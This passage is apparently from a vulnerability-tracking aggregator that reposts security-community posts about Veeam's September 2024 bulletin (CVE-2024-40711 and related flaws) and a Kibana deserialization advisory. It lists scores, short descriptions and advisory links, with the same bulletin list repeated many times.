  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Agent for Linux: CVE-2024-40709 (7.8 high) LPE

Veeam ONE:

  • CVE-2024-42024 (9.1 critical) RCE
  • CVE-2024-42019 (9.0 critical) access the NTLM
  • CVE-2024-42023 (8.8 high) EoP code execution
  • CVE-2024-42021 (7.5 high) access saved credentials
  • CVE-2024-42022 (7.5 high) modify product config files
  • CVE-2024-42020 (7.3 high) HTML injection

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

Veeam Backup for Nutanix AHV,Veeam Backup for Oracle Linux Virtualization Manager and Red Hat Virtualization: CVE-2024-40718 (8.8 high) LPE through SSRF

updated 2024-09-09T17:35:05.247000

##

CVE-2024-40710
(8.8 HIGH)

EPSS: 0.04%

updated 2024-09-09T17:35:04.207000

3 posts

A series of related high-severity vulnerabilities, the most notable enabling remote code execution (RCE) as the service account and extraction of sensitive information (savedcredentials and passwords). Exploiting these vulnerabilities requires a user who has been assigned a low-privileged role within Veeam Backup & Replication.

screaminggoat at 2024-09-05T14:07:10.779Z ##

  • CVE-2024-40711 (9.8 critical) RCE

  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

Veeam Backup for Nutanix AHV,Veeam Backup for Oracle Linux Virtualization Manager and Red Hat Virtualization: CVE-2024-40718 (8.8 high) LPE through SSRF

#veeam #vulnerability #cve

##
patchnow24x7 at 2024-09-05T13:51:57.516Z ##

CVE-2024-40711 : CVSS Score 9.8 : Critical Remote Code Execution vulnerability in Veeam Backup and Replication (VBR). Other vulnerabilities include CVE-2024-40713, CVE-2024-40710, CVE-2024-39718, CVE-2024-40714 and CVE-2024-40712.

Advisory:
https://www.veeam.com/kb4649

Patch Release Information:
https://www.veeam.com/kb4600

##
screaminggoat@infosec.exchange at 2024-09-05T14:07:10.000Z ##

Veeam Security Bulletin (September 2024). No mention of exploitation
Veeam Backup & Replication:

  • CVE-2024-40711 (9.8 critical) RCE
  • CVE-2024-40713 (8.8 high) MFA bypass
  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Agent for Linux: CVE-2024-40709 (7.8 high) LPE

Veeam ONE:

  • CVE-2024-42024 (9.1 critical) RCE
  • CVE-2024-42019 (9.0 critical) access the NTLM
  • CVE-2024-42023 (8.8 high) EoP code execution
  • CVE-2024-42021 (7.5 high) access saved credentials
  • CVE-2024-42022 (7.5 high) modify product config files
  • CVE-2024-42020 (7.3 high) HTML injection

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

Veeam Backup for Nutanix AHV,Veeam Backup for Oracle Linux Virtualization Manager and Red Hat Virtualization: CVE-2024-40718 (8.8 high) LPE through SSRF

#veeam #vulnerability #cve

##

CVE-2024-40711
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-09T16:35:05.923000

17 posts

A deserialization of untrusted data vulnerability with a malicious payload can allow an unauthenticated remote code execution (RCE).

1 repos

#search_error

itm4n at 2024-09-10T17:24:27.608Z ##

Cool blog post by my colleague @plopz0r !!!

"Getting code execution on Veeam through CVE-2023-27532"

👉 https://blog.scrt.ch/2024/09/10/getting-code-execution-on-veeam-through-cve-2023-27532/

This post has been awaiting publication for a loooooong time, at Veeam's request, but now that Watchtowr released their own detailed writeup, mainly describing the RCE found by my colleague a while ago, we decided to move forward and release it.

BTW, for a reason I ignore, he was not credited by Veeam (KB4649) for this discovery. I assume it's just an oversight on their end. :eyes: It's possible that it's a duplicate, but I have a hard time believing that he was not the first one to report this vulnerability given the timeline.

#cve_2024_40711 #veeam #cve #rce #windows #CVE_2023_27532

##
screaminggoat at 2024-09-09T15:43:10.483Z ##

watchTowr: Veeam Backup & Response - RCE With Auth, But Mostly Without Auth (CVE-2024-40711)
Reference: CVE-2024-40711 (9.8 critical, disclosed 04 September 2024 by Veeam) Veeam Backup & Replication: A deserialization of untrusted data vulnerability with a malicious payload can allow an unauthenticated remote code execution (RCE). This vulnerability was reported by reported by Florian Hauser @frycos with CODE WHITE Gmbh @codewhitesec.

watchTowr doing what they do best, root cause analysis of vulnerabilities and breaking it down Barney style. Veeam Backup and Replication's CVE-2024-40711 has an authenticated RCE with a 9.8? watchTowr does patch-diffing (a lot of code and rambling). They name drop James Forshaw @tiraniddo in referencing “Stupid is as Stupid Does When It Comes to .NET Remoting”

Okay in reading through this, CVE-2024-40711 is actually comprised of two separate bugs. Veeam silently patched an improper authorization bug, then the deserialisation bug 3 months later. watchTowr claims that there is a way to bypass CVE-2024-40711 (details are still under embargo). They do not release a proof of concept due to the current situation and proclivity for ransomware actors to go after Veeam backups.

#cve_2024_40711 #vulnerability #rootcauseanalysis #cve #veeam #infosec #cybersecurity

##
itm4n@infosec.exchange at 2024-09-10T17:24:27.000Z ##

"Getting code execution on Veeam through CVE-2023-27532"

This post has been awaiting publication for a loooooong time, at Veeam's request, but now that Watchtowr released their own detailed writeup, mainly describing the RCE found by my colleague a while ago, we decided to move forward and release it.

BTW, for a reason I ignore, he was not credited by Veeam (KB4649) for this discovery. I assume it's just an oversight on their end. :eyes: It's possible that it's a duplicate, but I have a hard time believing that he was not the first one to report this vulnerability given the timeline.

##
screaminggoat at 2024-09-05T14:07:10.779Z ##

Veeam Security Bulletin (September 2024). No mention of exploitation
Veeam Backup & Replication:

  • CVE-2024-40711 (9.8 critical) RCE
  • CVE-2024-40713 (8.8 high) MFA bypass
  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Agent for Linux: CVE-2024-40709 (7.8 high) LPE

Veeam ONE:

  • CVE-2024-42024 (9.1 critical) RCE
  • CVE-2024-42019 (9.0 critical) access the NTLM
  • CVE-2024-42023 (8.8 high) EoP code execution
  • CVE-2024-42021 (7.5 high) access saved credentials
  • CVE-2024-42022 (7.5 high) modify product config files
  • CVE-2024-42020 (7.3 high) HTML injection

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

Veeam Backup for Nutanix AHV,Veeam Backup for Oracle Linux Virtualization Manager and Red Hat Virtualization: CVE-2024-40718 (8.8 high) LPE through SSRF

#veeam #vulnerability #cve

Veeam Security Bulletin (September 2024). No mention of exploitation
Veeam Backup & Replication:

  • CVE-2024-40711 (9.8 critical) RCE
  • CVE-2024-40713 (8.8 high) MFA bypass
  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Agent for Linux: CVE-2024-40709 (7.8 high) LPE

Veeam ONE:

  • CVE-2024-42024 (9.1 critical) RCE
  • CVE-2024-42019 (9.0 critical) access the NTLM
  • CVE-2024-42023 (8.8 high) EoP code execution
  • CVE-2024-42021 (7.5 high) access saved credentials
  • CVE-2024-42022 (7.5 high) modify product config files
  • CVE-2024-42020 (7.3 high) HTML injection

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

##

CVE-2024-40713
(7.8 HIGH)

EPSS: 0.04%

updated 2024-09-09T15:35:08.970000

3 posts

A vulnerability that allows a user who has been assigned a low-privileged role within Veeam Backup & Replication to alter Multi-Factor Authentication (MFA) settings and bypass MFA.

screaminggoat at 2024-09-05T14:07:10.779Z ##

  • CVE-2024-40711 (9.8 critical) RCE

##

CVE-2024-40709
(7.8 HIGH)

EPSS: 0.04%

updated 2024-09-09T15:35:08.283000

2 posts

A missing authorization vulnerability allows a local low-privileged user on the machine to escalate their privileges to root level.

screaminggoat at 2024-09-05T14:07:10.779Z ##

Veeam Security Bulletin (September 2024). No mention of exploitation
Veeam Backup & Replication:

  • CVE-2024-40711 (9.8 critical) RCE
  • CVE-2024-40713 (8.8 high) MFA bypass
  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Agent for Linux: CVE-2024-40709 (7.8 high) LPE

Veeam ONE:

  • CVE-2024-42024 (9.1 critical) RCE
  • CVE-2024-42019 (9.0 critical) access the NTLM
  • CVE-2024-42023 (8.8 high) EoP code execution
  • CVE-2024-42021 (7.5 high) access saved credentials
  • CVE-2024-42022 (7.5 high) modify product config files
  • CVE-2024-42020 (7.3 high) HTML injection

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

Veeam Backup for Nutanix AHV,Veeam Backup for Oracle Linux Virtualization Manager and Red Hat Virtualization: CVE-2024-40718 (8.8 high) LPE through SSRF

#veeam #vulnerability #cve

(9.9 CRITICAL)

updated 2024-09-09T13:03:38.303000

2 posts

A deserialization issue in Kibana can lead to arbitrary code execution when Kibana attempts to parse a YAML document containing a crafted payload. This issue only affects users that use Elastic Security’s built-in AI tools https://www.elastic.co/guide/en/security/current/ai-for-security.html  and have configured an Amazon Bedrock connector https://www.elastic.co/guide/en/security/current/assista

1 repos

#search_error

screaminggoat at 2024-09-06T03:27:30.420Z ##

Elastic security advisory: Kibana 8.15.1 Security Update (ESA-2024-27, ESA-2024-28)

  • CVE-2024-37288 (CVSSv3.1: 9.9 critical) Kibana arbitrary code execution via YAML deserialization in Amazon Bedrock Connector
  • CVE-2024-37285 (CVSSv3.1: 9.1 critical) Kibana arbitrary code execution via YAML deserialization

No mention of exploitation. CVE-2024-37288 only affects users that use Elastic Security’s built-in AI tools 😂 and have configured an Amazon Bedrock connector.

#elastic #kibana #vulnerability #CVE

Veeam Security Bulletin (September 2024). No mention of exploitation
Veeam Backup & Replication:

  • CVE-2024-40711 (9.8 critical) RCE
  • CVE-2024-40713 (8.8 high) MFA bypass
  • CVE-2024-40710 (8.8 high) RCE
  • CVE-2024-39718 (8.1 high) EoP file deletion
  • CVE-2024-40714 (8.3 high) TLS issue allows sensitive credentials interception
  • CVE-2024-40712 (7.8 high) path traversal (cc: @reverseics @cR0w) allows LPE

Veeam Agent for Linux: CVE-2024-40709 (7.8 high) LPE

Veeam ONE:

  • CVE-2024-42024 (9.1 critical) RCE
  • CVE-2024-42019 (9.0 critical) access the NTLM
  • CVE-2024-42023 (8.8 high) EoP code execution
  • CVE-2024-42021 (7.5 high) access saved credentials
  • CVE-2024-42022 (7.5 high) modify product config files
  • CVE-2024-42020 (7.3 high) HTML injection

Veeam Service Provider Console:

  • CVE-2024-38650 (9.9 critical) access the NTLM
  • CVE-2024-39714 (9.9 critical) arbitrary file upload/RCE
  • CVE-2024-39715 (8.5 high) RCE
  • CVE-2024-38651 (8.5 high) file overwrite/RCE

Veeam Backup for Nutanix AHV,Veeam Backup for Oracle Linux Virtualization Manager and Red Hat Virtualization: CVE-2024-40718 (8.8 high) LPE through SSRF
